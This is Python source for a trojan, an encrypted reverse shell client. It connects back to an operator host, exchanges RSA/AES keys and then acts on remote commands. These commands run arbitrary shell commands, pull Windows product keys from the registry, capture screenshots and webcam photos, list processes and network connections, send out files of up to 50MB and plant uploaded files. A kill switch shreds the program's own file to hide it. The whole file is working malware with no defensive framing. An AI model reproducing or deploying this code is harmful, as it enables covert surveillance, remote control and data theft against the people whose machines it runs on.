import ctypes
import winreg as wrg
import socket
import subprocess
import os
import platform
import threading
import winreg
from Crypto.Cipher import AES
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
import base64
import json
import tempfile
import time
import sys
import locale
from datetime import datetime
import psutil
from PIL import ImageGrab
import cv2

# конфиг
HOST = '127.0.0.1'

class EncryptedReverseShell:
    def __init__(self):
        self.sock = None
        self.aes_key = None
        self.session_id = get_random_bytes(16)
        self.connected = False
        self.last_heartbeat = time.time()
        self.command_lock = threading.Lock()
        self.heartbeat_interval = 30 

    def get_port(self):
        return int(datetime.now().strftime("%d%m"))
        
    def get_system_encoding(self):
        try:
            if platform.system() == "Windows":
                kernel32 = ctypes.windll.kernel32
                codepage = kernel32.GetConsoleOutputCP()
                
                encoding_map = {
                    866: 'cp866',    # Russian DOS
                    1251: 'cp1251',  # Russian Windows
                    65001: 'utf-8',  # UTF-8
                    437: 'cp437',    # English DOS
                }
                return encoding_map.get(codepage, 'cp866')
            else:
                # for Linux/Mac
                return locale.getpreferredencoding() or 'utf-8'
        except:
            return 'utf-8'
    
    def generate_rsa_keys(self):
        key = RSA.generate(2048)
        return key, key.publickey()
    
    def aes_encrypt(self, data):
        if isinstance(data, str):
            data = data.encode('utf-8')
        elif isinstance(data, dict):
            data = json.dumps(data, ensure_ascii=False).encode('utf-8')
            
        cipher = AES.new(self.aes_key, AES.MODE_GCM)
        ciphertext, tag = cipher.encrypt_and_digest(data)
        return base64.b64encode(cipher.nonce + tag + ciphertext)
    
    def aes_decrypt(self, encrypted_data):
        try:
            encrypted_data = base64.b64decode(encrypted_data)
            nonce, tag, ciphertext = encrypted_data[:16], encrypted_data[16:32], encrypted_data[32:]
            
            cipher = AES.new(self.aes_key, AES.MODE_GCM, nonce=nonce)
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
            
            try:
                return json.loads(decrypted.decode('utf-8'))
            except:
                return decrypted.decode('utf-8')
        except Exception as e:
            return {"error": f"Decryption failed: {str(e)}"}
    
    def rsa_encrypt(self, public_key, data):
        cipher = PKCS1_OAEP.new(public_key)
        return base64.b64encode(cipher.encrypt(data))
    
    def rsa_decrypt(self, private_key, encrypted_data):
        cipher = PKCS1_OAEP.new(private_key)
        return cipher.decrypt(base64.b64decode(encrypted_data))
    
    def key_exchange(self):
        private_key, public_key = self.generate_rsa_keys()
        
        public_key_bytes = public_key.export_key()
        self.sock.send(str(len(public_key_bytes)).encode().ljust(16) + public_key_bytes)
        
        key_size = int(self.sock.recv(16).strip())
        encrypted_aes_key = self.sock.recv(key_size)
        
        self.aes_key = self.rsa_decrypt(private_key, encrypted_aes_key)
        
        self.send_encrypted({"type": "session", "status": "established", "session_id": self.session_id.hex()})
    
    def send_encrypted(self, data):
        with self.command_lock:
            try:
                if not self.sock:
                    return False
                    
                encrypted = self.aes_encrypt(data)
                self.sock.send(str(len(encrypted)).encode().ljust(16) + encrypted)
                self.last_heartbeat = time.time()
                return True
            except Exception as e:
                print(f"[-] Send failed: {e}")
                return False
    
    def recv_encrypted(self, timeout=30):
        with self.command_lock:
            try:
                if not self.sock:
                    return None
                    
                self.sock.settimeout(timeout)
                size_data = self.sock.recv(16)
                if not size_data:
                    return None
                    
                size = int(size_data.strip())
                encrypted_data = b""
                while len(encrypted_data) < size:
                    chunk = self.sock.recv(size - len(encrypted_data))
                    if not chunk:
                        return None
                    encrypted_data += chunk
                    
                self.last_heartbeat = time.time()
                return self.aes_decrypt(encrypted_data)
            except socket.timeout:
                return {"type": "heartbeat"}
            except Exception as e:
                print(f"[-] Receive failed: {e}")
                return None

    def send_heartbeat(self):
        try:
            return self.send_encrypted({"type": "heartbeat", "timestamp": time.time()})
        except:
            return False
        
    def is_admin(self):
        if ctypes.windll.shell32.IsUserAnAdmin():
            return True
        else:
            return False

    def get_product_key(self):
        key_path = r"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform\\"
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
        value_name = "BackupProductKeyDefault"
        try:
            value, value_type = winreg.QueryValueEx(key, value_name)
        except:
            if key:
                wrg.CloseKey(key)
            return 'Not Found'
        
        if key:
            wrg.CloseKey(key)

        return value

    def get_product_id(self):
        key_path = r"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\"
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
        value_name = "ProductID"
        try:
            value, value_type = winreg.QueryValueEx(key, value_name)
        except:
            if key:
                wrg.CloseKey(key)
            return 'Not Found'
        if key:
            wrg.CloseKey(key)
        return value
    
    def is_root(self):
        if os.getuid() == 0:
            return True
        else:
            return False

    def get_system_info(self):
        info = {
            "system": platform.system(),
            "node": platform.node(),
            "release": platform.release(),
            "version": platform.version(),
            "machine": platform.machine(),
            "processor": platform.processor(),
            "username": os.getenv('USERNAME') or os.getenv('USER'),
            "current_dir": os.getcwd(),
            "encoding": self.get_system_encoding(),
        }

        if platform.system() == 'Windows':
            info['is_admin'] = self.is_admin()
            info['product_id'] = self.get_product_id()
            info['product_key'] = self.get_product_key()
        else:
            info['is_root'] = self.is_root()
        
        try:
            info["cpu_cores"] = psutil.cpu_count()
            info["memory_total"] = round(psutil.virtual_memory().total / (1024**3), 2)
            info["memory_used"] = round(psutil.virtual_memory().used / (1024**3), 2)
            info["disk_usage"] = {}
            for partition in psutil.disk_partitions():
                try:
                    usage = psutil.disk_usage(partition.mountpoint)
                    info["disk_usage"][partition.device] = {
                        "total": round(usage.total / (1024**3), 2),
                        "used": round(usage.used / (1024**3), 2),
                        "free": round(usage.free / (1024**3), 2)
                    }
                except:
                    continue
        except Exception as e:
            info["psutil_error"] = str(e)
        
        return info

    def take_screenshot(self):
        try:
            screenshot = ImageGrab.grab()
            with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as tmp:
                screenshot.save(tmp.name, 'PNG')
                with open(tmp.name, 'rb') as f:
                    screenshot_data = f.read()
            os.unlink(tmp.name)
            
            return {
                "screenshot": base64.b64encode(screenshot_data).decode('utf-8'),
                "size": len(screenshot_data)
            }
        except Exception as e:
            return {"error": f"Screenshot failed: {str(e)}"}

    def take_camera_photo(self):
        try:
            camera = cv2.VideoCapture(0)
            if not camera.isOpened():
                return {"error": "Camera not available"}
            
            time.sleep(1)
            ret, frame = camera.read()
            camera.release()
            
            if not ret:
                return {"error": "Failed to capture image"}
            
            ret, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 80])
            if not ret:
                return {"error": "Failed to encode image"}
            
            photo_data = base64.b64encode(buffer).decode('utf-8')
            return {
                "camera_photo": photo_data,
                "size": len(photo_data)
            }
        except Exception as e:
            return {"error": f"Camera capture failed: {str(e)}"}

    def list_processes(self):
        try:
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_info', 'cpu_percent']):
                try:
                    processes.append({
                        "pid": proc.info['pid'],
                        "name": proc.info['name'],
                        "user": proc.info['username'],
                        "memory_mb": round(proc.info['memory_info'].rss / (1024**2), 1),
                        "cpu": round(proc.info['cpu_percent'], 1)
                    })
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            return {"processes": processes[:50]}
        except Exception as e:
            return {"error": f"Process list failed: {str(e)}"}

    def get_network_info(self):
        try:
            network_info = {
                "connections": [],
                "interfaces": {}
            }

            for interface, addrs in psutil.net_if_addrs().items():
                network_info["interfaces"][interface] = []
                for addr in addrs:
                    network_info["interfaces"][interface].append({
                        "family": str(addr.family),
                        "address": addr.address,
                        "netmask": addr.netmask
                    })

            for conn in psutil.net_connections(kind='inet'):
                if conn.laddr and conn.status == 'ESTABLISHED':
                    network_info["connections"].append({
                        "local_address": f"{conn.laddr.ip}:{conn.laddr.port}",
                        "status": conn.status,
                        "pid": conn.pid
                    })
            
            return network_info
        except Exception as e:
            return {"error": f"Network info failed: {str(e)}"}

    def download_file(self, file_path):
        try:
            if not os.path.exists(file_path):
                return {"error": "File not found"}
            
            if not os.path.isfile(file_path):
                return {"error": "Path is not a file"}
            
            file_size = os.path.getsize(file_path)
            if file_size > 50 * 1024 * 1024:  # 50MB limit
                return {"error": "File too large (max 50MB)"}
            
            with open(file_path, 'rb') as f:
                file_data = f.read()
            
            return {
                "file_data": base64.b64encode(file_data).decode('utf-8'),
                "file_name": os.path.basename(file_path),
                "file_size": len(file_data)
            }
        except Exception as e:
            return {"error": f"File read failed: {str(e)}"}

    def upload_file(self, file_data, file_name, target_path=None):
        try:
            file_bytes = base64.b64decode(file_data)
            
            if target_path:
                save_path = target_path
            else:
                save_path = os.path.join(os.getcwd(), file_name)
            
            save_dir = os.path.dirname(save_path)
            if save_dir and not os.path.exists(save_dir):
                os.makedirs(save_dir, exist_ok=True)
            
            with open(save_path, 'wb') as f:
                f.write(file_bytes)
            
            if os.path.exists(save_path):
                file_size = os.path.getsize(save_path)
                return {
                    "success": True,
                    "message": f"File uploaded successfully to {save_path}",
                    "file_size": file_size,
                    "saved_path": save_path
                }
            else:
                return {"error": "File upload failed - file not created"}
                
        except Exception as e:
            return {"error": f"File upload failed: {str(e)}"}
        
    def gutmann_patterns(self):
        patterns = []
    
        for _ in range(4):
            patterns.append([os.urandom(1) for _ in range(256)])
    
        patterns.append([b'\x55'] * 256)  # 01010101
        patterns.append([b'\xAA'] * 256)  # 10101010
        patterns.append([b'\x92\x49\x24'] * 85 + [b'\x92'])  # 10010010...
        patterns.append([b'\x49\x24\x92'] * 85 + [b'\x49'])  # 01001001...
        patterns.append([b'\x24\x92\x49'] * 85 + [b'\x24'])  # 00100100...
    
        for _ in range(4):
            patterns.append([os.urandom(1) for _ in range(256)])
    
        return patterns
    
    def kill(self, file_path):
        if not os.path.exists(file_path):
            return False
    
        file_size = os.path.getsize(file_path)
        patterns = self.gutmann_patterns()
    
        for i, pattern in enumerate(patterns):
            data = b''.join(pattern * (file_size // 256 + 1))[:file_size]
            
            with open(file_path, 'wb') as f:
                f.write(data)
    
        os.remove(file_path)
        return True

    def execute_kill_switch(self):
        try:
            print("[+] Kill switch activated - self-destructing...")
            
            if getattr(sys, 'frozen', False):
                current_file = sys.executable
            else:
                current_file = os.path.abspath(__file__)
            
            if self.sock:
                try:
                    self.sock.close()
                except:
                    pass
            
            if os.path.exists(current_file):
                try:
                    self.kill(current_file)
                    
                    time.sleep(2)
                    os._exit(0)
                except Exception as e:
                    print(f"[-] File deletion failed: {e}")
            
        except Exception as e:
            print(f"[-] Kill switch failed: {e}")
            try:
                sys.exit(1)
            except:
                os._exit(1)

    def execute_command(self, command_data):
        try:
            if isinstance(command_data, str):
                command = command_data
                cmd_type = "shell"
            else:
                cmd_type = command_data.get("type", "shell")
                command = command_data.get("command", "")
                upload_data = command_data.get("upload_data")
                target_path = command_data.get("target_path")
                file_name = command_data.get("file_name")
            
            if cmd_type == "shell":
                if command.startswith('cd '):
                    path = command[3:].strip()
                    try:
                        os.chdir(path)
                        return {"output": f"Changed directory to {os.getcwd()}"}
                    except Exception as e:
                        return {"error": f"cd failed: {str(e)}"}
                
                try:
                    system_encoding = self.get_system_encoding()
                    
                    result = subprocess.run(
                        command, 
                        shell=True, 
                        capture_output=True, 
                        timeout=30
                    )

                    stdout = result.stdout.decode(system_encoding, errors='replace')
                    stderr = result.stderr.decode(system_encoding, errors='replace')
                    
                    output = stdout
                    if stderr:
                        output += f"\nERROR: {stderr}"
                        
                    return {"output": output if output else "", "encoding": system_encoding}
                    
                except subprocess.TimeoutExpired:
                    return {"error": "Command timed out"}
                except Exception as e:
                    return {"error": f"Command execution failed: {str(e)}"}
            
            elif cmd_type == "info":
                return {"system_info": self.get_system_info()}
            
            elif cmd_type == "screenshot":
                return {"screenshot_result": self.take_screenshot()}
            
            elif cmd_type == "cam":
                return {"camera_result": self.take_camera_photo()}
            
            elif cmd_type == "processes":
                return {"process_list": self.list_processes()}
            
            elif cmd_type == "network":
                return {"network_info": self.get_network_info()}
            
            elif cmd_type == "download":
                return {"download_result": self.download_file(command)}
            
            elif cmd_type == "kill_switch":
                def delayed_destruction():
                    time.sleep(1)
                    self.execute_kill_switch()
                
                destruction_thread = threading.Thread(target=delayed_destruction, daemon=True)
                destruction_thread.start()
                
                return {"killed": "OK! Trojan destroyed and connection terminated."}
            
            elif cmd_type == "upload":
                if upload_data and file_name:
                    return {"upload_result": self.upload_file(upload_data, file_name, target_path)}
                else:
                    return {"error": "Missing upload data or filename"}
            
            elif cmd_type == "heartbeat":
                return {"type": "heartbeat", "status": "alive"}
            
            else:
                return {"error": f"Unknown command type: {cmd_type}"}
            
        except Exception as e:
            return {"error": f"Execution failed: {str(e)}"}
    
    def start_shell(self):
        print("[+] Shell started, waiting for commands...")
        self.connected = True
        last_heartbeat_sent = time.time()
        
        while self.connected:
            try:
                command_data = self.recv_encrypted(timeout=30)
                
                if command_data is None:
                    print("[-] Connection lost")
                    break
                
                if isinstance(command_data, dict) and command_data.get("type") == "heartbeat":
                    if time.time() - last_heartbeat_sent > self.heartbeat_interval:
                        self.send_encrypted({"type": "heartbeat", "status": "alive"})
                        last_heartbeat_sent = time.time()
                    continue
                
                if time.time() - self.last_heartbeat > 300:
                    print("[-] Connection timeout")
                    break
                
                if isinstance(command_data, str) and command_data in ["exit", "quit"]:
                    self.send_encrypted({"type": "status", "message": "Session terminated"})
                    break
                
                result = self.execute_command(command_data)
                if not self.send_encrypted(result):
                    print("[-] Failed to send response")
                    break
                
                last_heartbeat_sent = time.time() if isinstance(result, dict) and result.get("type") == "heartbeat" else last_heartbeat_sent
                    
            except socket.timeout:
                if time.time() - last_heartbeat_sent > self.heartbeat_interval:
                    if not self.send_heartbeat():
                        print("[-] Heartbeat failed, connection lost")
                        break
                    last_heartbeat_sent = time.time()
                continue
            except Exception as e:
                print(f"[-] Error in shell: {e}")
                try:
                    self.send_encrypted({"error": f"Shell error: {str(e)}"})
                except:
                    break
                continue
        
        self.connected = False
    
    def connect(self):
        max_retries = 5
        retry_delay = 10
        
        while True:
            for attempt in range(max_retries):
                try:
                    print(f"[+] Attempting connection to {HOST}:{self.get_port()} (attempt {attempt + 1}/{max_retries})")
                    
                    self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    self.sock.settimeout(30)
                    self.sock.connect((HOST, self.get_port()))
                    
                    print("[+] Connected, performing key exchange...")
                    
                    self.key_exchange()
                    
                    print("[+] Key exchange completed, starting shell...")

                    self.start_shell()
                    
                    print("[-] Shell session ended, reconnecting...")
                    break
                    
                except Exception as e:
                    print(f"[-] Connection failed: {e}")
                    if self.sock:
                        self.sock.close()
                        self.sock = None
                    
                    if attempt < max_retries - 1:
                        print(f"[+] Retrying in {retry_delay} seconds...")
                        time.sleep(retry_delay)
                    else:
                        print(f"[-] Max retries exceeded, waiting {retry_delay * 2} seconds before new cycle...")
                        time.sleep(retry_delay * 2)
                        break
            
            print(f"[+] Starting new connection cycle in {retry_delay * 3} seconds...")
            time.sleep(retry_delay * 3)

if __name__ == "__main__":
    shell = EncryptedReverseShell()
    shell.connect()
